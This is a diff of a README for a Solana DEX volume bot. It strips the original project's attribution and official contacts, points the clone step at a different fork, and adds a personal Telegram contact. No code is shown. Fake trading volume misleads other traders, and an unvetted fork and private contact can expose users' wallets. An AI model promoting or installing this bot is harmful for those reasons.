@@ -1,6 +1,6 @@
 # Solana Volume Bot
 
-A high-performance, multi-threaded bot for generating volume on Solana DEXes using the Solana Swap API from Solana Tracker [https://docs.solanatracker.io](https://docs.solanatracker.io)
+A high-performance, multi-threaded bot for generating volume on Solana DEXes using the Solana Swap API from Solana Tracker
 
 ## Features
 
@@ -26,8 +26,8 @@ A high-performance, multi-threaded bot for generating volume on Solana DEXes usi
 ## Installation
 
 1. Clone the repository:
-   git clone https://github.com/YZYLAB/solana-volume-bot.git
-   cd solana-volume-bot
+   git clone https://github.com/muffin819/solana-volume-bot-v3.git
+   cd solana-volume-bot-v3
 
 2. Install dependencies:
    npm install
@@ -65,15 +65,13 @@ Adjust the settings in your `.env` file to customize the bot's behavior:
 
 ## API Usage and Fees
 
-This bot uses the Solana Swap API from [SolanaTracker.io](https://docs.solanatracker.io).
 
 **Note**: The Swap API charges a fee for usage:
 - Standard fee: 0.5% on each successful transaction
 - For high-volume users: Fees can be reduced to as low as 0.1% (subject to approval)
 
 For high-volume usage or inquiries about reduced fees, please contact:
-- Discord: [SolanaTracker Discord](https://discord.gg/JH2e9rR9fc)
-- Email: swap-api@solanatracker.io
+- Telegram: https://t.me/dogewhiz
 
 ## Disclaimer
 
@@ -83,10 +81,10 @@ This bot is for educational purposes only, we don't recommend the use of volume 
 
 [MIT License](LICENSE)
 
-## Contributing
-
-Contributions, issues, and feature requests are welcome! Feel free to check [issues page](https://github.com/YZYLAB/solana-volume-bot/issues).
-
 ## Support
 
 If you like this project, please consider giving it a ⭐️ on GitHub!
+
+## Contact
+
+Telegram:  https://t.me/dogewhiz
